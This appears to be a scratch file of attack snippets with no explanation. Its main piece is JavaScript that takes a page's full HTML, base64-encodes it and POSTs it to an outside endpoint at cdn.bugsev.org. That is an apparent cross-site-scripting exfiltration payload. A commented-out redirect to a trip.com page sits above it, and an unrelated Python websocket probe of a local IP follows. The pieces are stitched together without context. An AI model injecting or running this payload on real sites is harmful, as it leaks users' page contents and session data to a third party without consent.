//setTimeout(() => {
  //window.location.href = "https://www.trip.com/travel-guide/personal-home/5B0331C7B13B98575B7383FEB36159AB0A22D2851A580B9627C7CF0FB02BD1BB?locale=en_us&curr=USD";
//}, 3000); // 3 seconds


const html = document.documentElement.outerHTML;
const base64 = btoa(unescape(encodeURIComponent(html)));

fetch('https://cdn.bugsev.org/endpoint', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ html: base64 })
});




import websocket

IP = "192.168.1.100"
PORT = 8080
PATH = "/"

url = f"ws://{IP}:{PORT}{PATH}"

try:
    ws = websocket.create_connection(url)

    print("[+] Connected successfully!")

    # Print the HTTP handshake response
    print(f"Status: {ws.status}")
    print("\nHeaders:")
    for header, value in ws.headers.items():
        print(f"{header}: {value}")

    # Optionally receive the first message (if the server sends one)
    try:
        msg = ws.recv()
        print(f"\nReceived: {msg}")
    except Exception:
        print("\nNo initial message received.")

    ws.close()

except Exception as e:
    print(f"[-] Connection failed: {e}")
